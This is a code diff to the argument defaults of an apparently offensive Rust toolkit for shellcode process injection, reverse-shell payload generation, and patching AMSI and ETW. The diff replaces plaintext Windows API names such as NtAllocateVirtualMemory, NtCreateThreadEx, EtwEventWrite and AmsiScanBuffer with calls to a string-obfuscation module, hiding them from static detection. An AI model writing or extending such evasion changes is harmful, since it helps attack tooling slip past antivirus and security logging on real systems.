@@ -49,8 +49,8 @@ impl CLI {
             target_pid: 0,
             inject_technique: String::from("createremote"),
             payload: String::from("shellcode.bin"),
-            syscall_func: String::from("NtAllocateVirtualMemory"),
-            unhook_func: String::from("NtCreateThreadEx"),
+            syscall_func: crate::obf::s(crate::obf::NT_ALLOC_VM),
+            unhook_func: crate::obf::s(crate::obf::NT_CREATE_THREAD),
             convert_input: String::new(),
             convert_output: String::from("payload.bin"),
             convert_format: String::from("auto"),
@@ -61,8 +61,8 @@ impl CLI {
             generate_lhost: String::from("127.0.0.1"),
             generate_lport: 4444,
             scan_filter: String::new(),
-            etw_target: String::from("EtwEventWrite"),
-            amsi_target: String::from("AmsiScanBuffer"),
+            etw_target: crate::obf::s(crate::obf::ETW_EVENT_WRITE),
+            amsi_target: crate::obf::s(crate::obf::AMSI_SCAN_BUFFER),
             encrypt_method: String::from("xor"),
             encrypt_key: String::new(),
             ppid_parent: String::new(),
@@ -71,7 +71,7 @@ impl CLI {
             indirect: false,
             sleep_method: String::from("manual"),
             sleep_duration: 3000,
-            spoof_func: String::from("NtAllocateVirtualMemory"),
+            spoof_func: crate::obf::s(crate::obf::NT_ALLOC_VM),
         };
 
         let mut i = 1;
